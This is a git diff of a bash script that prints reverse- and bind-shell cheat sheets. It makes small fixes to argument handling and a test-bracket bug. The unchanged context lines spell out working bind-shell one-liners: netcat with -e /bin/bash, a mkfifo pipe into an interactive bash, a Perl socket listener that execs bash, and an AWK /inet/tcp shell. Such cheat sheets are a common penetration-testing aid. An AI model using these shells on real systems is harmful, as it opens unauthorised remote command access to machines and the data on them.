@@ -141,6 +141,7 @@ display_reverse_shell_cheat () {
                 echo "xterm"
                 ;;
             *)
+                display_help && exit 1
                 ;;
         esac
     else
@@ -153,20 +154,20 @@ display_bind_shell_cheat () {
     if [ "$#" != 0 ]
     then
         case "$1" in
-            netcat | nc)
+            netcat|nc)
                 echo -e "\033[31m\033[1mBIND SHELL CHEAT: [netcat]\033[m"
                 echo -e "\033[31m\033[1mTraditional:\033[m"
                 echo -e "\t\033[1mnc -nlvp $PORT -e /bin/bash\033[m"
                 echo -e "\033[31m\033[1mNetcat OpenBsd:\033[m"
                 echo -e "\t\033[1mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp $PORT >/tmp/f\033[m"
                 ;;
-            perl | pl)
+            perl|pl)
                 echo -e "\033[31m\033[1mBIND SHELL CHEAT: [perl]\033[m"
                 echo -e "\t\033[1mperl -e 'use Socket;\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\
 bind(S,sockaddr_in(\$p, INADDR_ANY));listen(S,SOMAXCONN);for(;\$p=accept(C,S);\
 close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'\033[m"
                 ;;
-            AWK | awk)
+            AWK|awk)
                 echo -e "\033[31m\033[1mBIND SHELL CHEAT: [AWK]\033[m"
                 echo -e "\t\033[1mawk 'BEGIN{s=\"/inet/tcp/$PORT/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'\033[m"
                 ;;
@@ -174,6 +175,7 @@ close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/b
                 echo "xterm"
                 ;;
             *)
+                display_help && exit 1
                 ;;
         esac
     else
@@ -224,10 +226,9 @@ else
 fi
 
 # Main execution
-check_ip "$IP" && check_port "$PORT"
-
-if [ "$BIND_SHELL" = "False"]
+if [ "$BIND_SHELL" = "False" ]
 then
+    check_ip "$IP" && check_port "$PORT"
     display_reverse_shell_cheat "$LANGUAGE"
 else
     display_bind_shell_cheat "$LANGUAGE"
